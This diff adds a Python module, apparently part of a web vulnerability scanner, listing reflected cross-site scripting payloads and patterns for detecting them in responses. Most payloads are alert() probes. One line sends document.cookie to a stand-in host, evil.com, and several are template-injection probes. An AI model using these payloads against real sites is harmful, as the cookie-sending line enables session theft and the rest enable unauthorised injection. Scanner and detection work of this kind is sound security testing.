@@ -1,0 +1,53 @@
+"""Payloads para detección de Cross-Site Scripting (XSS) reflejado."""
+
+QUICK_PAYLOADS = [
+    '<script>alert("XSS")</script>',
+    '"><script>alert("XSS")</script>',
+    "'><script>alert('XSS')</script>",
+    '<img src=x onerror=alert("XSS")>',
+    '"><img src=x onerror=alert("XSS")>',
+    '<svg onload=alert("XSS")>',
+    '<body onload=alert("XSS")>',
+    "javascript:alert('XSS')",
+    '<div onmouseover=alert("XSS")>test</div>',
+    '{{constructor.constructor("return this")()}}',
+]
+
+FULL_PAYLOADS = [
+    '<script>alert(String.fromCharCode(88,83,83))</script>',
+    '<img src="x" onerror="alert(document.cookie)">',
+    '<svg/onload=alert("XSS")>',
+    '<input onfocus=alert("XSS") autofocus>',
+    '<marquee onstart=alert("XSS")>',
+    '<details open ontoggle=alert("XSS")>',
+    '<video><source onerror=alert("XSS")>',
+    '<iframe src="javascript:alert(\'XSS\')">',
+    '"><svg/onload=alert("XSS")//',
+    "'-alert('XSS')-'",
+    '<a href="javascript:alert(\'XSS\')">click</a>',
+    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert("XSS")>',
+    '<script>fetch("http://evil.com/?c="+document.cookie)</script>',
+    '{{7*7}}',
+    '${alert("XSS")}',
+    '<img src=1 onerror=alert`XSS`>',
+    '<script>confirm("XSS")</script>',
+    '<object data="javascript:alert(\'XSS\')">',
+    '<embed src="javascript:alert(\'XSS\')">',
+    '<style>@import "javascript:alert(\'XSS\')";</style>',
+]
+
+# Patrones que indican XSS reflejado en la respuesta
+DETECTION_PATTERNS = [
+    '<script>alert("XSS")</script>',
+    '<script>alert(\'XSS\')</script>',
+    'onerror=alert',
+    'onload=alert',
+    'onmouseover=alert',
+    'onfocus=alert',
+    'ontoggle=alert',
+    'onstart=alert',
+    'javascript:alert',
+    '<svg/onload=',
+    '<img src=x onerror=',
+    '<iframe src="javascript:',
+]
